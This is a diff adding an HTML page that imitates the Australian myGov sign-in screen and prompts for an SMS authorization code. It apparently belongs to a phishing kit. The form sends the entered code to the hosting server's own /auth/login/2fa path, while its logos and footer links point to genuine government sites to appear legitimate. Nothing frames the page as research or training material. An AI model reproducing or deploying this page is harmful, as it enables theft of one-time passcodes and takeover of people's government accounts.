@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>
+    Sign in
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="shortcut icon" href="/img/favicon.png" type="image/png">
+	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="/js/jquery.js"></script>
+</head>
+
+<body>
+  <header role="banner" class="header">
+    <section class="wrapper">
+      <div class="inner">
+        <div class="cbLogin-grid">
+          <div class="cbLogin-grid-row">
+            <a href="https://beta.my.gov.au/" class="cbLogin-logo__link">
+              <img id="cbLogin-logo" src="/img/logo-dark.svg" role="img">
+            </a>
+
+            <div class="header-links">
+              <a href="https://beta.my.gov.au/en/about/help">Help</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </header>
+
+  <div class="wrapper-mapwap">
+    <div class="main-block" role="main">
+      <div class="cbLogin">
+        <div class="login-grid-container">
+          <div class="login-grid-row">
+            <div class="login-grid-column">
+              <div class="login-card-wrapper">
+                <div class="main-login-card override">
+                  <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                  <h1>Verify Information with myGov</h1>
+                  <p class="login-instruction-text">An authorization code was sent to you via text to your mobile number.</p>
+
+                  <form class="cb-login-form alternative" action="/auth/login/2fa" method="post">
+                    <div class="input-group">
+                      <label class="override" for="otp"  style="font-weight: bold;">Check your mobile phone and enter the authorization code:</label>
+                      <div>
+                        <input id="otp" name="otp" class="cb-input" type="text" autocomplete="off">
+                      </div>
+                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter the authorization code.</p>
+                    </div>
+
+                    <p class="recovery"></p>
+
+                    <div class="button-main-container override">
+                      <div class="button-container">
+                        <button type="submit" class="button-main button-submit">Next</button>
+                      </div>
+                    </div>
+
+                    <p class="create-account-text">
+											<a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.
+										</p>
+                  </form>
+
+                  <div class="hr-word">
+                    <div class="draw-circle">
+                      or
+                    </div>
+                  </div>
+
+                  <div class="login-card secondary">
+                    <div class="button-login-container">
+                      <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
+                      <div class="login-option-container">
+                        <div class="inner-options">
+                          <p class="external-links-zone">
+                            What is <a href="https://www.digitalidentity.gov.au/">Digital Identity</a> and <a href="https://www.mygovid.gov.au/">myGovID</a>?
+                          </p>
+                          <a class="button-digital-identity" href="https://login.my.gov.au/las/mygov-login?execution=e1s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+        <section class="footer-list">
+          <nav>
+            <h2 class="sr-only">Footer</h2>
+            <ul class="lower-links">
+              <li>
+                <a href="https://my.gov.au/en/about/terms">Terms of use</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/copyright">Copyright</a>
+              </li>
+              <li>
+                <a href="https://my.gov.au/en/about/accessibility">Accessibility</a>
+              </li>
+            </ul>
+          </nav>
+        </section>
+
+        <div class="footer-lower">
+          <section class="footer-lower-logo">
+            <a href="https://beta.my.gov.au/">
+              <img src="/img/logo-light.svg" width="313.17" height="70" role="img">
+            </a>
+          </section>
+
+          <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/js/main.js"></script>
+</body>
+
+</html>
